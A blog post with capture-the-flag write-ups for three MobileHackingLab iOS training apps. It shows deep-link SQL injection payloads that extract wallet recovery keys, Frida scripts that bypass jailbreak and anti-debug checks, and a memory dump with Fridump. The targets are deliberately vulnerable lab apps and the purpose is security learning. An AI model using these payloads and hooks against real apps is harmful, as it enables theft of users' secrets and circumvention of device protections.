---
title: MobileHackingLab IOS Challenges Writeups 
author: Muhammad Adel
date: 2025-04-07 13:40:00 +0200
categories: [IOS Security]
tags: [ios security, writeups]
---

## **Introduction**

Peace be upon all of you. In this post, I am going to share writeups for some of the IOS Challenges of the free MobileHackingLab IOS Application Security course.

Course Link: [https://www.mobilehackinglab.com/course/free-ios-application-security-course](https://www.mobilehackinglab.com/course/free-ios-application-security-course)

Challenges Link: [https://www.mobilehackinglab.com/free-mobile-hacking-labs](https://www.mobilehackinglab.com/free-mobile-hacking-labs)

![image.png](/assets/MHL/main.png)

## **FlipCoin Wallet**

**Description**

> The challenge is centered around a fictious crypto currency flipcoin and its wallet Flipcoin Wallet. The Flipcoin wallet is an offline wallet giving users full ownership of their digital assets. The challenge highlights the potential entrypoints that can lead to further serious vulnerabilities including SQL injection. As an attacker, your aim is to craft an exploit that can be used to attack other users of the application.

**Objective**

> Craft a payload to gain access to the local database: Your task is to find your way to the locally stored SQL database and craft an exploit that can access the recovery keys of another user's wallet.

Let’s start by installing the application on our iPhone device via the `ideviceinstaller` tool.

```bash
$ ideviceinstaller install com.mobilehackinglab.Flipcoin-Wallet6.ipa
WARNING: could not locate iTunesMetadata.plist in archive!
WARNING: could not locate Payload/Flipcoin Wallet.app/SC_Info/Flipcoin Wallet.sinf in archive!
Copying 'com.mobilehackinglab.Flipcoin-Wallet6.ipa' to device... DONE.
Installing 'com.mobilehackinglab.Flipcoin-Wallet6'
Install: CreatingStagingDirectory (5%)
Install: ExtractingPackage (15%)
Install: InspectingPackage (20%)
Install: TakingInstallLock (20%)
Install: PreflightingApplication (30%)
Install: InstallingEmbeddedProfile (30%)
Install: VerifyingApplication (40%)
Install: CreatingContainer (50%)
Install: InstallingApplication (60%)
Install: PostflightingApplication (70%)
Install: SandboxingApplication (80%)
Install: GeneratingApplicationMap (90%)
Install: Complete
```

Let’s familiarize ourselves with the app logic:

![home.png](/assets/MHL/home.png)

It seems that we have some a crypto coins wallet with some balance and the ability to send and receive money.

![send.PNG](/assets/MHL/send.png)

The receive function is giving us a QR code to share with the senders.

![2.png](/assets/MHL/2.png)

Hamm! So where can we inject our SQL payload? Maybe the `sendTo` or the Amount fields are vulnerable? But I had an issue in my iPhone 6s testing device after typing; the keyboard didn’t disappear, so I wasn’t able to click the send button.

I tried also to link my device with Burp Suite to see if there are any requests going underline, but I only found this request:

![image.png](/assets/MHL/image.png)

Let’s inspect application files to see if we can find something interesting:

```bash
PS > ssh root@192.168.1.17
iPhone:/var/mobile/Containers/Data/Application root$ ls -R | grep coin
./62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Library/Caches/com.mobilehackinglab.Flipcoin-Wallet6:
./62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Library/Caches/com.mobilehackinglab.Flipcoin-Wallet6/com.apple.metal:
./62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Library/Caches/com.mobilehackinglab.Flipcoin-Wallet6/com.apple.metalfe:
./62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Library/Caches/com.mobilehackinglab.Flipcoin-Wallet6/fsCachedData:
iPhone:/ root$ cd  /var/mobile/Containers/Data/Application/62BA1BD8-F7C8-49E8-8CD0-014265959BA9
iPhone:/var/mobile/Containers/Data/Application/62BA1BD8-F7C8-49E8-8CD0-014265959BA9 root$ cd Documents
iPhone:/var/mobile/Containers/Data/Application/62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Documents root$ ls
your_database_name.sqlite
```

Let’s examine this SQLite file:

```bash
iPhone:/var/mobile/Containers/Data/Application/62BA1BD8-F7C8-49E8-8CD0-014265959BA9/Documents root$ sqlite3 your_database_name.sqlite
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE wallet (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        address TEXT,
        currency FLOAT,
        amount FLOAT,
        recovery_key TEXT
    );
CREATE TABLE sqlite_sequence(name,seq);
sqlite> .tables
wallet
sqlite> SELECT * FROM wallet;
1|0x252B2Fff0d264d946n1004E581bb0a46175DC009|flipcoin|0.3654|FLAG{fl1p_d4_c01nz}}
2|1W5vKAAKmBAjjtpCkGZREjgEGjrbwERND|bitcoin|15.26|BATTLE TOADS WRITING POEMS
```

Oh?? Is this the challenge? We have found the two recovery keys along with the flag. But this is not how the challenge should be solved? We need to extract this data via SQL injection.

With no hope, I have tried to scan the QR code above to see what is inside, and I found this interesting DeepLink:

```bash
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=000
```

Let’s try to run it and see what we will return from the application, we will use the `uiopen` command inside the iPhone shell:

```bash
# flipcoin://[WalletAddress]?[amountParamter]=[value]
uiopen "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003"  
```

Executing this command will open the following screen on the iPhone device.

![1.png](/assets/MHL/1.png)

I thought the amount might be the vulnerable parameter, but where will the results come back? Getting back to Burp Suite I found this interesting request:

![normal request.png](/assets/MHL/normal_request.png)

Let’s study again the SQL schema before injecting any command:

```sql
sqlite> .schema
CREATE TABLE wallet (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        address TEXT,
        currency FLOAT,
        amount FLOAT,
        recovery_key TEXT
    );
CREATE TABLE sqlite_sequence(name,seq);
sqlite> .tables
wallet
sqlite> SELECT * FROM wallet;
1|0x252B2Fff0d264d946n1004E581bb0a46175DC009|flipcoin|0.3654|FLAG{fl1p_d4_c01nz}}
2|1W5vKAAKmBAjjtpCkGZREjgEGjrbwERND|bitcoin|15.26|BATTLE TOADS WRITING POEMS
```

So we have 5 columns, and our goal is to get the `recovery_key` column. What I can notice from the request is that the first value of the `params` is the address of the first ID. So let’s inject a SQL payload that changes the ID to 2.

```bash
# Payload: AND id=2;--
uiopen "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003%20AND%20id=2;--"
```

![sql 1.png](/assets/MHL/sql_1.png)

Great! The second wallet address was added in the request. Now we know that we have a SQL injection we know can get the `recovery_key` column. After some trial and error, the union technique worked with:

```bash
# Payload: UNION SELECT 0,'ItsFadinG',3,4,'a' LIMIT 1;--
uiopen "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003%20UNION%20SELECT%200,'ItsFadinG',3,4,'a'%20LIMIT%201;--"
```

![image.png](/assets/MHL/image%201.png)

Lastly, let’s get both recovery keys:

```bash
# UNION SELECT 0,(SELECT recovery_key FROM wallet),3,4,'a' LIMIT 1;--
# UNION SELECT 0,(SELECT recovery_key FROM wallet WHERE id=2),3,4,'a' LIMIT 1;
uiopen "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003%20UNION%20SELECT%200,(SELECT%20recovery_key%20FROM%20wallet),3,4,'a'%20LIMIT%201;--"
uiopen "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003%20UNION%20SELECT%200,(SELECT%20recovery_key%20FROM%20wallet%20WHERE%20id=2),3,4,'a'%20LIMIT%201;--"
```

![Untitled.png](/assets/MHL/Untitled.png)

## **No Escape**

**Description**

> The challenge centers around a fictitious app called No Escape, designed with robust jailbreak detection mechanisms. Your mission is to bypass these mechanisms and gain full access to the app's functionalities using Frida.

**Objective**

> Your task is to evade the jailbreak detection implemented in the No Escape app to execute arbitrary code and access all app features.

App package Name: `com.mobilehackinglab.No-Escape` 

Let’s open our app, and we got the following message as expected:

![IMG_0026.PNG](/assets/MHL/IMG_0026.png)

Let’s try to find the classes responsible for Jailbreak Detection:

![image.png](/assets/MHL/image%202.png)

hmm! There is no output; let’s analyze the binary file via Ghidra and search for the message that was previously shown:

![image.png](/assets/MHL/image%203.png)

For more clarification, I have renamed the variables, and it is obvious that the application is checking for jailbreak:

![image.png](/assets/MHL/image%204.png)

Let’s check the  `_$s9No_Escape12isJailbrokenSbyF()` function implementation.

```c
bool _$s9No_Escape12isJailbrokenSbyF(void)
{
  bool bVar1;
  dword dVar2;
  dword local_18;
  dword local_14;
  
  dVar2 = _$s9No_Escape22checkForJailbreakFiles33_BCE8F13474E5A52C60853EA803F80A81LLSbyF();
  if ((dVar2 & 1) == 0) {
    local_14 = _$s9No_Escape33checkForWritableSystemDirectories33_BCE8F13474E5A52C60853EA803F80A81LLSbyF();
  }
  else {
    local_14 = 1;
  }
  if ((local_14 & 1) == 0) {
    local_18 = _$s9No_Escape12canOpenCydia33_BCE8F13474E5A52C60853EA803F80A81LLSbyF();
  }
  else {
    local_18 = 1;
  }
  if ((local_18 & 1) == 0) {
    bVar1 = _$s9No_Escape21checkSandboxViolation33_BCE8F13474E5A52C60853EA803F80A81LLSbyF();
  }
  else {
    bVar1 = true;
  }
  return bVar1 != false;
}
```

Functions appear to be implemented in SWIFT and their names are mangled (obfuscated). We have two ways to bypass this, either by trying to hook each function check or just simply hook and modify the return value of the main function: `_$s9No_Escape12isJailbrokenSbyF()`.

I have used the following script to bypass the function and return False for the jailbreak.

```javascript
var myMethod = Module.findExportByName(null, "$s9No_Escape12isJailbrokenSbyF");

if (myMethod) {
    Interceptor.attach(myMethod, {
        onLeave: function (retval) {
            console.log("Returned Swift value:", retval);
            // You can inspect or modify retval here
            retval.replace(0)
            console.log("Modefied Return Swift value TO: ", retval);
        }
    });
} else {
  console.log("Hooking Swift method failed!");
}
```

Let’s run this script with Frida and get our Flag:

```powershell
PS D:\Testing Tools\Frida\IOS> frida -H 192.168.1.11 -f com.mobilehackinglab.No-Escape -l .\NoEscape.js
     ____
    / _  |   Frida 16.5.6 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://frida.re/docs/home/
   . . . .
   . . . .   Connected to 192.168.1.11 (id=socket@192.168.1.11)
Spawned `com.mobilehackinglab.No-Escape`. Resuming main thread!
[Remote::com.mobilehackinglab.No-Escape ]-> Returned Swift value: 0x1
Modefied Return Swift value TO:  0x0
```

![IMG_0027.PNG](/assets/MHL/IMG_0027.png)

## **Captain Nohook**

**Description**

> This challenge focuses on a fictitious app called Captain No Hook, which implements advanced anti-debugging / jailbreak detection techniques. Your objective is to bypass these protections and retrieve the hidden flag within the app.

**Objective**

> Your task is to overcome the protection mechanisms implemented in the Captain NoHook app to reveal the hidden flag.

App package Name: `com.mobilehackinglab.Captain-Nohook`

Let’s examine the application:

![IMG_0028.PNG](/assets/MHL/IMG_0028.png)

Once the flag button is clicked, the app displays the following message and closes:

![IMG_0029.PNG](/assets/MHL/IMG_0029.png)

Let’s analyze the applications function with Ghidra and Search for the encountered string:

![image.png](/assets/MHL/image%205.png)

This string is part of the `_$s14Captain_Nohook14ViewControllerC7getFlagSSyF` function. And this message is being shown if the return value of the `_$s14Captain_Nohook22is_noncompliant_deviceSbyF()` is an even number:

```c
if ((isNonCompliantDeviceCheckValue & 1) != 0) {
    local_1c8 = 0;
    _$sSo17UIAlertControllerCMa();
    NoncompliantToastMessage = "Noncompliant device detected!";
    iVar19 = 0x1d;
    local_1b4 = 1;
    _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC
              ("Noncompliant device detected!",0x1d,1);
    pcVar6 = "Yerr hook won\'t work!";
    iVar13 = 0x15;
    local_1d8 = NoncompliantToastMessage;
    local_1d0 = iVar19;
    _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC
              ("Yerr hook won\'t work!",0x15,local_1b4 & 1);
    local_1b0 = _$sSo17UIAlertControllerC5title7message14preferredStyleABSSSg_AFSo0abF0VtcfCTO
                          (local_1d8,local_1d0,pcVar6,iVar13);
    _$sSo13UIAlertActionCMa();
    NoncompliantToastMessage = "OK";
    iVar19 = 2;
    _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC("OK",2,local_1b4 & 1);
    local_1c0 = _$sSo13UIAlertActionC5title5style7handlerABSSSg_So0aB5StyleVyABcSgtcfCTO
                          (NoncompliantToastMessage,iVar19,local_1c8,0x1000097cc,local_1c8);
    _objc_msgSend(local_1b0,"addAction:");
    _objc_release(local_1c0);
    _objc_msgSend(unaff_x20,"presentViewController:animated:completion:",local_1b0,local_1b4 & 1,0);
    _objc_release(local_1b0);
  }
```

So, let’s bypass this by changing the return value of this Swift function using the following script:

```javascript
var myMethod = Module.findExportByName(null, "$s14Captain_Nohook22is_noncompliant_deviceSbyF");

if (myMethod) {
    Interceptor.attach(myMethod, {
        onLeave: function (retval) {
            console.log("Returned Swift value:", retval);
            // You can inspect or modify retval here
            retval.replace(4)
            console.log("Modefied Return Swift value TO: ", retval);
        }
    });
} else {
  console.log("Hooking Swift method failed!");
}
```

And the application opens, but without giving the flag? Hmm!

![IMG_0030.PNG](/assets/MHL/IMG_0030.png)

Searching for the new string appeared, but it doesn’t lead to anything.

![image.png](/assets/MHL/image%206.png)

Reviewing the challenge description and app approach again, they said that the flag is going to be inside the application memory:

So let’s use Fridump tool to get the flag:

```bash
$ frida-ps -U | grep "hook"
56716  Captain Nohook

$ python3 fridump.py -U "Captain Nohook"
        ______    _     _
        |  ___|  (_)   | |
        | |_ _ __ _  __| |_   _ _ __ ___  _ __
        |  _| '__| |/ _` | | | | '_ ` _ \| '_ \
        | | | |  | | (_| | |_| | | | | | | |_) |
        \_| |_|  |_|\__,_|\__,_|_| |_| |_| .__/
                                         | |
                                         |_| 
Current Directory: /opt/fridump
Output directory is set to: /opt/fridump/dump
Starting Memory dump...
/opt/fridump/fridump.py:119: DeprecationWarning: Script.exports will become asynchronous in the future, use the explicit Script.exports_sync instead
  agent = script.exports
Progress: [################################################--] 95.74% Complete
Finished!
                                                                                  
$ cd dump                                                        
$ strings * | grep -i 'mhl{'            
MHL{H00k_1n_Y0ur_D3bUgg3r}
```

## **Conclusion**
I found those challenges very interesting, and I wanted to resume the others, but unfortunately there was an error on the rest of them. Maybe because my iPhone testing device is very old, even though I have contacted the MobileHackingLab team, but with no response. Any way, I hope you enjoyed it PEACE!